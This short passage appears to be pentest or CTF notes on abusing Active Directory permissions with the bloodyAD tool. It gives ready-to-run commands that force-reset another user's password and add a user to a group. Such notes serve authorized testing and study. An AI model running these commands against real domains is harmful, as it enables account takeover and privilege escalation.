


### 1. ForceChange User password using BloodyAD


If we have `ForceChangePassword` over a user, we can use bloodyAD to change their password


```bash
bloodyAD --host $IP -u 'ownedUser' -p 'password' set password 'targetuser' 'password-to-be-set'
```



### 2. Add a user to a group using BloodyAD


If we have `AddSelf` for a user or `GenericAll`, we can add them to a group using bloodyAD


```bash
bloodyAD --host $IP -d domain -u 'owneduser' -p 'password' add groupMember "GroupName" "User-to-be-added"
```